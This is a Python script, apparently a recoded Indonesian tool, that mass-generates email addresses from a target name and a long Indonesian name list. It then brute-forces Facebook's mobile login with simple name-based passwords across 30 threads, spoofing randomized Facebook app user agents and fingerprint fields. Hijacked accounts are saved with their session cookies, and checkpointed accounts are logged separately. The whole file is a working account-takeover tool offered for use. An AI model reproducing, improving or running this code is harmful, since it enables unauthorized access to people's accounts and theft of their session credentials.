import os, re, bs4, sys, json, rich, time, random, datetime, requests; from time import sleep, strftime; from rich.console import Console; from rich.panel import Panel; from random import choice as rc; from random import randint as rr; from random import randrange as rg; from concurrent.futures import ThreadPoolExecutor; now = datetime.datetime.now(); dta = {'1':'Jan','2':'Feb','3':'Mar','4':'Apr','5':'Mei','6':'Jun','7':'Jul','8':'Agu','9':'Sepr','10':'Okt','11':'Nov','12':'Des'}; tgl = now.day; bln = dta[(str(now.month))]; thn = now.year; okc = ('OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'); cpc = ('CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'); ok,cp,loop,id,id2,idf,P,M,K,B,H,N,bsp,ses = 0,0,0,[],[],[],'\x1b[1;97m','\x1b[1;91m','\x1b[1;93m','\x1b[1;94m','\x1b[1;92m','\x1b[0m',bs4.BeautifulSoup,requests.Session()
 #recode EL408 Author asli entah siapa ane kagak tau 
def Main_Menu():
	NiawMXV()
	nama = Console().input(' > Masukan Nama target: ')
	dump = Console().input(' > Mau berapa Jumlah User: ')
	CC = 0
	for xv in range(int(dump)):
		AA = nama; BB = Inisial(); CC += 1; cc = str(rr(0,999))
		domains = (["gmail"]*80) + (["yahoo"]*20)
		DD = f'@{rc(domains)}.com'
		EE = rc([
			f'{AA}{rc(["",".",""])}{BB}{rc(["",".",""])}{rc([f"{CC}",f"{cc}"])}{DD}',
			f'{BB}{rc(["",".",""])}{AA}{rc(["",".",""])}{rc([f"{CC}",f"{cc}"])}{DD}',
			f'{AA}{rc(["",".",""])}{rc([f"{CC}",f"{cc}"])}{DD}',
			f'{AA}{rc(["",".",""])}{BB}{DD}',
			f'{BB}{rc(["",".",""])}{AA}{DD}'
		])
		FF = f'{EE}|{nama}'
		if FF in id: pass
		else: id.append(FF)
		print(f" > terkumpul {len(id)} email", end=("\r"))
		sleep(0.0007)
	Eksekusi()
ugen2 = []
ugen = []
    
def Eksekusi():
	for x in id: id2.append(x)
	NiawMXV(); Console(width=50).print(Panel(f"[underline][bold #FF00D4][bold #FFFFFF]Terkumpul [bold #00FF00]{len(id)}[bold #FFFFFF] User[bold #FF00D4] [/underline]",style="bold white",width=50),justify="center"); print()
	with ThreadPoolExecutor(max_workers=30) as MethodCrack:
		for uids in id2:
			user = uids.split('|')[0]; nmfl = uids.split('|')[1].lower(); nama = nmfl.split(' ')[0]; pasw = ['kata sandi',nama,nama+'12',nama+'123',nama+'1234',nama+'12345',nama+'123456',nama+'12345678',nama+'123456789',nama+'321',nama+'01',nama+'12',nama+'21',nama+' '+nama]
			MethodCrack.submit(Async,user,pasw,nmfl)
	print('\n'); Console().print(f'[bold #FFFFFF] > Brute [bold #00FF00]{len(id)}[bold #FFFFFF] Email selesai | akun ok:[bold #00FF00]{ok} [bold #FFFFFF]akun cp:[bold #FFFF00]{cp}'); exit()

def Async(user, pasw, nmfl):
	ses = requests.Session()
	rc = random.choice
	rr = random.randint
	usr = user.split('@')[0]
	global loop,ok,cp
	print(f"{P}{P} Proses {['🕛','🕐','🕑','🕒','🕓','🕔','🕕','🕖','🕗','🕘','🕙','🕚'][loop % 12]} {P}{loop} {H}OK: {ok}{K} | CP: {K}{cp}\033[1;32m", end="\r")
	ua = Metanatural()
	for pw in pasw:
		try:
			requ = ses.get(
    "https://x.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=5&refid=9").text
			kueh = ";".join([f"{k}={v}" for k, v in ses.cookies.get_dict().items()])
			data = {
    "m_ts": re.search(r'name="m_ts" value="(.*?)"', requ).group(1),
    "li": re.search(r'name="li" value="(.*?)"', requ).group(1),
    "try_number": "0",
    "unrecognized_tries": "0",
    "email": user,
    "prefill_contact_point": user,
    "prefill_source": "browser_dropdown",
    "prefill_type": "password",
    "first_prefill_source": "browser_dropdown",
    "first_prefill_type": "contact_point",
    "had_cp_prefilled": "true",
    "had_password_prefilled": "true",
    "is_smart_lock": "false",
    "bi_xrwh": re.search(r'name="bi_xrwh" value="(.*?)"', requ).group(1),
    "bi_wvdp": (
        '{"hwc":false,"has_dnt":true,"has_standalone":false,'
        '"wnd_toStr_toStr":"function toString() { [native code] }",'
        '"hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,'
        '"has_hwi_bt":false,"has_agjsi":false,'
        '"iframeProto":"function get contentWindow() { [native code] }",'
        '"remap":false,"iframeData":{"hwc":false,"has_dnt":true,'
        '"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }",'
        '"hasPerm":false,"has_seWo":true,"has_creds":true,"has_hwi_bt":false,'
        '"has_agjsi":false}}'
    ),
    "encpass": f"#PWD_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{pw}",
    "fb_dtsg": re.search(r'{"dtsg":{"token":"(.*?)"', requ).group(1),
    "jazoest": re.search(r'name="jazoest" value="(.*?)"', requ).group(1),
    "lsd": re.search(r'name="lsd" value="(.*?)"', requ).group(1),
    "__dyn": "",
    "__csr": "",
    "__req": "1",
    "__fmt": "1",
    "__a": re.search(r'"encrypted":"(.*?)"', requ).group(1),
    "__user": "0",
}
			head = {
    "Host": "m.facebook.com",
    "Content-Length": str(len(str(data))),
    "Sec-CH-UA": '"Android WebView";v="106", "Chromium";v="106", "Not.A/Brand";v="99"',
    "Sec-CH-UA-Mobile": "?1",
    "User-Agent": ua,
    "X-Response-Format": "JSONStream",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-FB-LSD": re.search(r'name="lsd" value="(.*?)"', requ).group(1),
    "Sec-CH-UA-Platform-Version": '"9.0.0"',
    "X-Requested-With": "XMLHttpRequest",
    "X-ASBD-ID": "129477",
    "Sec-CH-UA-Full-Version-List": (
        '"Android WebView";v="106.0.6422.53", '
        '"Chromium";v="106.0.6422.53", "Not.A/Brand";v="99.0.0.0"'
    ),
    "Sec-CH-UA-Model": '"2"',
    "Sec-CH-Prefers-Color-Scheme": "dark",
    "Sec-CH-UA-Platform": '"Android"',
    "Accept": "*/*",
    "Network-Type": "wifi",
    "Connection": "keep-alive",
    "Origin": "https://m.facebook.com",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "Priority": "u=2,i",
}
			resp = ses.post(
    "https://x.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",
				cookies = {'cookie': kueh}, data = data, headers = head, allow_redirects = False
			) 
			if "c_user" in ses.cookies.get_dict():
				kue = ';'.join([x+'='+v for x,v in ses.cookies.get_dict().items()])
				uid = re.findall('c_user=(.*);xs',kue)[0]
				if uid in idf or user in idf:
					break
				idf.append(uid)				
				ok+=1
				print(f"{P}══════════════════════════════════════════════════")
				print(f"{P}{H}       [{P}OK{H}] {uid} {P}★ {H}{pw}    {P}  ")
				print(f"{P}══════════════════════════════════════════════════")
				print(f"{H}{kue}")
				print(f"{P}══════════════════════════════════════════════════")
				open('Okeh/'+okc,'a').write(f'{uid}|{pw}|{kue}\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				try: uid = ses.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
				except: uid = user
				if uid in idf:
					break
				idf.append(uid)
				cp+=1
				print(f"{P}══════════════════════════════════════════════════")
				print(f"{P}{K}       [{K}CP{K}] {uid} {P}★ {K}{pw}    {P}  ")
				print(f"{P}══════════════════════════════════════════════════")
				open('Cepe/'+cpc,'a').write(f'{uid}|{pw}\n')
				break
			else: continue
		except (requests.exceptions.ConnectionError): sleep(10)
	loop +=1

def NiawMXV():
    os.system('clear')
    colors = ["\033[34m",  # biru tua
              "\033[36m",  # cyan
              "\033[32m",  # hijau
              "\033[33m",  # kuning
              "\033[37m",  # putih
              "\033[31m"]  # merah
    C = random.choice(colors)
    print(f"""{C}  
███╗   ███╗███████╗████████╗ █████╗ 
████╗ ████║██╔════╝╚══██╔══╝██╔══██╗
██╔████╔██║█████╗     ██║   ███████║
██║╚██╔╝██║██╔══╝     ██║   ██╔══██║
██║ ╚═╝ ██║███████╗   ██║   ██║  ██║
╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
""")
def Inisial(): return rc(['aca','acha','ai','aii','adawiah','adawiyah','ade','adell','adel','adellaa','adelia','adellia','adeliya','adiba','adifa','adinda','aeni','aidah','aini','ainun','aira','asiah','aisah','aisyah','afifah','afipah','alawiah','alawiyah','ajahra','ajeng','ajeung','ajig','ajijah','ajizah','alesha','alia','alika','alimah','aliya','alifa','alifah','aliva','alivah','aliyah','almeera','almira','ama','amalia','amaliah','amaliyah','amanda','amidah','amira','aminah','ana','anantasia','anantasya','anastasia','anastasya','andini','ani','anisa','anita','any','anying','anyun','anggraeni','anggraini','anggi','anggita','anggun','anugerah','anugrah','anjing','apifah','apipah','april','aprilia','aprillia','apriliani','apriliyani','aprilianti','apriliyanti','aqila','aqilla','ara','arra','arafah','arrafah','areta','aretha','arofah','arin','arini','ariani','arista','ariyani','aryani','aryanti','arianti','ariyanti','arumi','arsita','arsyita','arsila','asyila','asypa','asifa','asipa','asmi','asmara','asih','asilah','asti','astiani','astiyani','astuti','atik','atika','atikah','ayg','ayank','ayang','ayra','ayu','ayyu','ayunda','ayuni','ayudia','ayudiya','ayudiah','ayuningsih','azzahra','azijah','azizah','azmi','azmy','azura','babi','baby','badriah','bajingan','bagong','bangsat','bela','bella','bibah','bila','billa','bintang','bulan','bunga','bungsu''cabi','cabhy','caby','cabby','caca','cca','cahaya','cahya','cahyani','camelia','cangcut','cans','canss','cantik','cantika','celsi','celsie','centil','chaca','chacha','chelsi','chelsie','chelsea','chika','cia','cci','cici','cika','cimok','cindy','cinta','cintia','cintaku','cintya','cintiya','citra','chindy','cucu','ccu','culun','cupu','cynthia','cyntia','dafina','dahlia','dania','daniah','daniyah','danyyah','daswita','dara','davina','dea','dede','dela','della','delia','delicia','denia','deniah','deniyah','deon','debi','deby','debby','denita','denisa','devi','devia','devie','desnia','desnie','divita','desi','desita','deswita','dwi','dewi','dewita','dhe','dhea','dheniah','dhewi','dhita','dhiya','dia','diah','diajeng','dian','diana','diandra','diannova','dias','dika','diksa','dila','dilla','dipa','diva','dianda','dila','dilla','dira','dina','dinda','dini','diniah','diniyah','disa','disha','dita','diya','diyah','dona','dyra','dyah','eka','eira','elfi','elia','eliana','elin','elina','elisabeth','elis','ellis','elise','eliya','eliza','elizabeth','ella','elma','elmira','elisa','elisha','elisia','elisiya','elisya','elisyha','elfina','elsa','evi','epi','elin','elsy','elva','elvira','elly' 'elvina','emi','emilia','emy','emyliya','ema','emma','endah','endang','erna','erni','erika','erlinda','esti','estiana','eis','eti','etie','ety','euis','eva','evita','evitamala','evalina','ewe','farah','farrah','fadila','fadla','fadhila','fadhla','faija','faiza','faizza','faizah','fani','fanni','fany','fanny','fanya','farida','faridha','fatin','fatim','faujia','faujiah','fauzia','fauziah','fauziya','fauzyah','fawziyah','fazila','fazilla','fazeela','fatima','fatimah','fathimah','felisia','felisya','ferli','ferly','fika','fina','fiona','fionna','fida','fira','firli','firly','fitri','fitriani','fitriyani','fitryani','frisilia','frisiliya','freya','friska','fuji','fuzi','gaby','gabby','gadis','geby','gebby','gelsey','gendis','gemoy','gea','ghea','gia','ghia','ghina','ghita','gina','ginna','gisela','gisella','gita','gitta','greta','gresik','giska','ganesha','geisha','habibah','hafsa','halima','halia','halimah','hafiza','hafsah','hafiza','hafizah','hana','handayani','handayanti','hanna','hannah','hani','hany','hanny','hanifah','hanipah','hania','haniya','hartini','hasanah','hatima','hatimah','hilda','hilma','hilmawati','hemalia','hepti','hesa','hessa','hesha','hesti','hestia','hesty','helga','hasna','hopi','hopipah','hoho','hotima','hotimah','hikmah','humaida','humayda','husna','hurairah','ica','icaa','icha','ichaa','ifa','iffa','ilmira','ina','inna','inaara','inara','inarah','inayah','indah','indira','indyra','indri','indry','insan','insani','imelda','ina','irma','irena','ika','ijah','intan','intanrahayu','ira','isabela','isabella','isan','isana','isyana','isah','isma','ismawati','ismawaty','ismi','isnaeni','iza','izah','jafira','jahira','jalilah','jahra','jamilah','jannah','jasmin','jayanti','jelita','jeni','jeny','jenita','jesica','jesika','jihan','jihana','jingga','juwita','juli','julia','juliana','juliet','jumaina','jumainah','juniarti','junaina','juwitta','jwita','kaila','kalia','kaira','khaira','karin','karina','kartika','kadek','kania','kaniya','kartini','kasih','kamala','kamila','karomah','karisa','karsih','katrina','keira','khaira','khaila','khafifah','khadijah','khairun','khairunisa','khalifah','khatimah','khopipah','kiki','kim','kila','kira','kirani','komarudin','kumala','kumalasari','kokom','komala','komalasari','kontol','kotima','kotimah','kulsum','kultsum','kuntul','kurnia','kurniati','kurniyati','kursina','kurniasih','kusmiati','kusmiyai','laela','lala','laila','lati','laty','latifah','lathifah','layla','laras','larasati','lasmini','laura','laudia','laudya','lela','lesmana','lena','leni','leny','lestari','lestary','lesti','lesty','levita','lia','lida','lidia','lidya','liana','liani','lilis','lina','linda','lintang','lis','lisa','lisha','lisna','lisnawati','lisnawaty','listi','listy','listia','listya','liza','liya','liyani','liza','lomrah','lulu','luna','lusi','lusy','luvita','lyna','lysa','mae','maemunah','maesarah','maesaroh','mala','maida','maidah','maira','maisa','maisha','malika','maimunah','magfirah','mahalini','maharani','maharini','mahda','mahmud','manda','mandha','maria','mardiah','mardianti','mardiyanti','mardyah','mardiyah','mariah','mariam','mariyah','maryati','mariati','mariyati','markonah','mariyam','marisa','marissa','martina','martinah','martini','maryamah','marwah','maryanti','marwati', 'marwaty','marzia','marziya','masitoh','masriah','masriyah','maulida','maulidia','maulidya','maulidiya','mawar','maya','mayra','maymuna','maymunah','marziah','meca','mecca','meka','mega','melani','melany','meli','melinda','melisa','melly','memek','mia','mila','mimin','mira','mirna','miranda','miya','mufliha','munaroh','munawarah','munawaroh','murni','murniati','murniyati','muslima','mulimah','muti','mutmainah','muthmainnah','mutmaidah','muthmaidah','mutia','mutiara','nabila','nada','nadhin','nadia','nadira','nadhira','nadin','nadiya','nafisa','nafisha','nafisah','nagita','naila','naira','najwa','nana','nanda','nani','natalia','nataliya','natasia','natasya','natasyha','naura','nayara','nayla','naswa','nashwa','nazwa','nia','nida','nifa','nina','nindi','nindy','ningrum','ningsih','nita','nitatalia','niken','nisa','nissa','nurul','nopi','novi','novita','nurull','nunung','nuri','nurianti','nurjanah','nuryanti','oca','octa','octavia','olivia','okta','oktavia','ocha','padma','putri','puspa','pipit','paramita' 'permata','permatasari','purnama','purnamasari','puspa','putri','puteri','pitri','pratiwi','pramita','priska','prisilia','qaila','qasimah','qila','qiqi','rana','rafa','raisa','rahma','rahmah','rahmawati','rahmawaty','rhma','rahnadani','rahmadhani','ramadani','ramadhani','rani','rany','rasya','rati','rara','rere','refa','repa','reva','repani','revani','rena','renatri','reni','renata','rani','ratna','rina','rida','rifda','rifdah','rini','ririn','rianti','rianty','riyanti','riyanty','riska','rizka','rohma','rohmah','rohmawati','rohmawaty','rosdiana','rosdiani','ross','rossa','rosita','rosalina','rosmanah','rum','rumaidah','ruwaidah','ryzka','sahara','saleha','salimah','sabrina','safa','saffa','safna','safira','saidah','sahira','sakila','sakinah','sakira','salma','salsa','salsabila','salsabyla','salwa','santi','sani','santy','santika','sara','shafira','shavira','shakira','shafna','shaleha','shalehah','shakeera','shakila','shalihah','shanti','shanty','shantika','shani','shaniyah','shofy','shofiyah','shofiyyah','sholeha','sholehah','sifa','silawati','sipa','silpi','silvi','siska','sinta','suci','selly','safitri','saputri','sarah','saras','sarasvati','saraswati','sari','sasmita','setiawati','sisil','siti','sity','siregar','simanjuntak','soleha','solehah','sonia','shonia','soraya','sukma','suci','sumi','sumiyati','suratni','surtini','suratmi','sasanti','susanty','susi','susilawati','susilawaty','susy','sutari','suteni','susu','syafaa','syakila','syakira','syifa','sypa','sya','syahla','syahira','syafira','syavira','tabita','tabhita','talia','taliah','talita','talitha','tami','tamimah','tammy','tania','taniya','tari','tarisa','tasya','taskia','taskiya','tazkia','tazkiya','tesa','tea','thea','thiara','tia','tias','tiastuti','tiara','tifani','tifany','tika','tina','tita','titian','titie','titin','tri','triani','tsunade','tsusilawati','tuti','tya','tiktok','tikotok','uci','uchi','ulfa','ulan','ulandari','ulandary','ulia','uliya','ulya','ulpah','ulpa','ulva','umayah','umi','umy','umiyah','umiati','umiaty','umiyati','utami','utari','ute','ubaidah','umaira','umairah','usna','usnah','uswah','uswatun','uswatunhasanah','uzwatun','vani','vany','vanya','valen','valentina','vanesa','vera','victoria','viktoria','via','vina','vivi','vivie','vianita','viola','veronica','veronika','viani','vianika','viana','viera','valencia','valensia','vita','vitaloka','vilmei','vega','viona','visi','wafa','wafda','wahdah','wardani','wardhani','wahdaniyah','wahidah','wanda','wangi','wardah','wastiqah','wati','watiah','watilah','watiyah','watsiqah','wasikoh','welas','wening','widi','widia','widhia','widhiya','widiya','widiasari','widiawati','widy','wikayah','wilona','windi','windiawati','windiasari','wina','wini','wiqayah','wikoyah','wiwin','windy','wulan','wulandari','xyz','xyzz','tzy','tyz','mojang','gemoy','imut','kebi','tembem','tete','gelis','geulis','ytta','kasep','ganteng','wibu','gojo','gojosatoru','santik','gerengseng','bokep','ewe','xtc','brigez','01','02','03','04','05','06','07','08','09','010','001','002','003','004','005','006','007','008','009','0010','00','000','0000','12345','123456','yani','yanti','yanto','yanty','yasira','yeni','yuli','yulia','yuliya','yulya','yulianti','yuliyanti','yuni','yunita','yuningsih','yuyu','yuyun','zahra','zafira','zahira','zahiyah','zahra','zahrani','zahrany','zahwa','zainab','zakiah','zaqiyah','zenab','zalfa','zalpa','zalva','zaskia','zaskiya','zaskiani','zaskiyani','zizah','zenia','zera','zhafira','zhafirah','zharifa','zharifah','zia','zizi','zyzy','zubaidah','zuhrah','zulfa','zulpa','zulva','zunaira','zunea'])


















def Metanatural(account_id=None, fb_only=True):
    import random, hashlib
    rnd = random.Random()
    if account_id is not None:
        seed = int(hashlib.sha256(str(account_id).encode()).hexdigest()[:16], 16)
        rnd.seed(seed)
    else:
        rnd.seed()

    fb_app_versions = [f"{v}.{rnd.randint(0,9)}.{rnd.randint(0,199)}" for v in [
        "440.0.0","420.0.0","410.0.0","400.0.0","395.0.0","390.0.0","380.0.0","370.0.0","366.0.0","360.0.0","350.0.0"
    ]]
    webview_builds = [f"{v}" for v in [
        "146.0.0.0","145.0.0.0","144.0.0.0","143.0.0.0","142.0.0.0",
        "140.0.0.0","138.0.0.0","135.0.0.0","134.0.0.0","133.0.0.0"
    ]]
    android_versions = (
        ["7.0","7.1.1","8.0.0","8.1.0","9","10","11","12","12.1","13","14","14.1","15"]
        + ["11","12","13","14"]*2
    )
    dpis = ["120dpi","160dpi","213dpi","240dpi","280dpi","300dpi","320dpi","360dpi","400dpi","420dpi","480dpi","560dpi"]
    resolutions = [
        "480x800","540x960","720x1280","720x1520","1080x1920","1080x2160","1080x2280","1080x2340","1080x2400",
        "1200x1920","1440x2560","1440x3040","1440x3120","2160x3840","2340x1080","2400x1080","2688x1242","2960x1440",
        "3200x1440","3120x1440","2880x1440"
    ]
    brands_models = {
        "Samsung":[
            "SM-G930F","SM-G950F","SM-G960F","SM-G973F","SM-G975F","SM-G981B","SM-G986B","SM-G988B",
            "SM-G990E","SM-G996B","SM-G998B","SM-A505F","SM-A515F","SM-A715F","SM-F916B","SM-F946B","SM-S918B"
        ],
        "Google":[
            "Pixel 2","Pixel 3","Pixel 3a","Pixel 4","Pixel 4a","Pixel 5","Pixel 5a","Pixel 6","Pixel 6a","Pixel 7",
            "Pixel 7a","Pixel 8","Pixel 8 Pro"
        ],
        "OnePlus":[
            "ONEPLUS A5000","ONEPLUS 6","ONEPLUS 6T","ONEPLUS 7","ONEPLUS 7T","ONEPLUS 8","ONEPLUS 8T","ONEPLUS 9",
            "ONEPLUS 9 Pro","ONEPLUS 10","ONEPLUS 11","ONEPLUS 12","ONEPLUS 13"
        ],
        "Xiaomi":[
            "Mi 5","Mi 6","Mi 8","Mi 9","Mi 10","Mi 11","Mi 11 Ultra","Xiaomi 12","Xiaomi 13","Xiaomi 14",
            "Redmi Note 4","Redmi Note 7","Redmi Note 8","Redmi Note 9 Pro","POCO F6 Pro","POCO X3"
        ],
        "OPPO":[
            "CPH1823","CPH1909","CPH1951","CPH2015","CPH2239","CPH2301","OPPO Reno2","OPPO Reno3","OPPO Reno10 Pro",
            "OPPO Find X2","OPPO Find X3","OPPO Find X5","OPPO Find X6"
        ],
        "vivo":[
            "V1734","V1813","V1911","V2027","V2043","V2111","V2201","V2304","vivo X70","vivo X80","vivo X90","vivo X100"
        ],
        "Realme":[
            "RMX1901","RMX2001","RMX3081","RMX3092","Realme GT","Realme GT2","Realme GT6","Realme 13 Pro"
        ],
        "Motorola":[
            "Moto G5","Moto G6","Moto G7","Moto G8","Moto G9","Moto G30","Moto G52","Moto G54","Edge 40","Edge 50","Edge 50 Pro"
        ],
        "Nokia":[
            "Nokia 6.1","Nokia 7.1","Nokia 8.1","Nokia X30","Nokia XR21","Nokia G60"
        ],
        "Sony":[
            "Xperia XZ","Xperia XZ1","Xperia XZ2","Xperia 1","Xperia 5","Xperia 1 II","Xperia 1 III","Xperia 1 V"
        ],
        "Huawei":[
            "P8","P9","P10","P20","P30","P40","P50","P60","Mate 20","Mate 30","Mate 40","Mate 50","P50 Pro","P60 Pro"
        ],
        "Asus":[
            "ASUS_Z01KD","ASUS_X00TD","ROG Phone","ROG Phone II","ROG Phone 3","ROG Phone 6"
        ],
        "LG":[
            "LG G5","LG G6","LG V30","LG G7","LG G8","LG Velvet"
        ],
        "Motorola_Razr":[
            "razr","razr 2019","razr 2020"
        ]
    }
    chip_builds = [
        "qcom","sd400","sdm425","sdm450","sdm625","sdm660","sdm670","sdm675","sdm710","sdm720","sdm730","sdm765","sdm778",
        "sdm845","sdm855","sdm865","sdm870","sdm888","sdm8+ Gen1","sdm8+ Gen2","exynos","exynos9810","exynos2100",
        "kirin970","kirin980","kirin990","dimensity800","dimensity900","dimensity1200","dimensity1300","mediatek","apple"
    ]
    build_tags = [
        "NRD90M","QP1A.190711.020","MMB29M","PPR1.180610.011","RP1A.200720.012","SP1A.210812.016",
        "TP1A.220624.014","UP1A.231005.007","QD1A.230711.012","TQ1A","RKQ1.200826.002"
    ]
    locales = [
        "en_US","en_GB","en_AU","id_ID","ms_MY","th_TH","es_ES","es_MX","pt_BR","fr_FR","de_DE","it_IT","nl_NL","vi_VN","ar_SA","hi_IN"
    ]
    storage_variants = ["32GB","64GB","128GB","256GB","512GB","1TB"]
    def choice(seq): return rnd.choice(seq)
    def randint(a,b): return rnd.randint(a,b)

    brand = choice(list(brands_models.keys()))
    model = choice(brands_models[brand])
    android = choice(android_versions)
    dpi = choice(dpis)
    reso = choice(resolutions)
    chip = choice(chip_builds)
    build_tag = f"Build/{choice(build_tags)}"
    locale = choice(locales)
    storage = choice(storage_variants)
    def maybe_typo(txt):
        if rnd.random() < 0.06:
            pos = rnd.randint(0, len(txt)-1)
            return txt[:pos] + choice("abcdefghijklmnopqrstuvwxyz") + txt[pos+1:]
        return txt

    def fb_app_ua():
        app_ver = choice(fb_app_versions)
        extras = f"; FBPN/com.facebook.katana; FBDV/{model}/{storage}; FBSV/{android}; FBLC/{locale};" if rnd.random() < 0.75 else ""
        net = choice(["; 5G","; 4G","; LTE","; WiFi",""])
        arch = f" ({choice(['aarch64','armv8l','arm','arm64-v8a'])})" if rnd.random() < 0.55 else ""
        battery = f"; Battery/{randint(8,100)}%" if rnd.random() < 0.65 else ""
        screen = f"; {dpi}; {reso}" if rnd.random() < 0.9 else f"; {dpi}"
        return f"Facebook/{app_ver} (Android {android}; {maybe_typo(model)}{screen}; {chip}; {build_tag}{extras}{net}{battery}{arch})"

    def fb_webview_ua():
        webv = choice(webview_builds)
        chrome_v = f"{randint(100,140)}.0.{randint(4000,9999)}.{randint(0,300)}"
        app_ver = choice(fb_app_versions)
        fb_meta = f"(FBAN/FB4A;FBAV/{app_ver};FBDV/{maybe_typo(model)};FBSV/{android};FBLC/{locale};FBPN/com.facebook.katana)"
        return f"Mozilla/5.0 (Linux; Android {android}; {maybe_typo(model)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_v} Mobile Safari/537.36 {fb_meta} FB_FW/{webv}"

    def messenger_ua():
        app_ver = choice(fb_app_versions)
        chrome_v = f"{randint(100,140)}.0.{randint(4000,9999)}.{randint(0,300)}"
        fb_meta = f"(FBAN/MessengerLite;FBAV/{app_ver};FBDV/{maybe_typo(model)};FBSV/{android};FBLC/{locale};FBPN/com.facebook.mlite)"
        return f"Mozilla/5.0 (Linux; Android {android}; {maybe_typo(model)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_v} Mobile Safari/537.36 {fb_meta}"

    r = rnd.random()
    if fb_only:
        if r < 0.6:
            return fb_app_ua()
        elif r < 0.9:
            return fb_webview_ua()
        else:
            return messenger_ua()
    else:
        if r < 0.45:
            return fb_app_ua()
        elif r < 0.8:
            return fb_webview_ua()
        else:
            return messenger_ua()
if __name__=='__main__':
	try: os.mkdir('Okeh')
	except: pass
	try: os.mkdir('Cepe')
	except: pass; Main_Menu()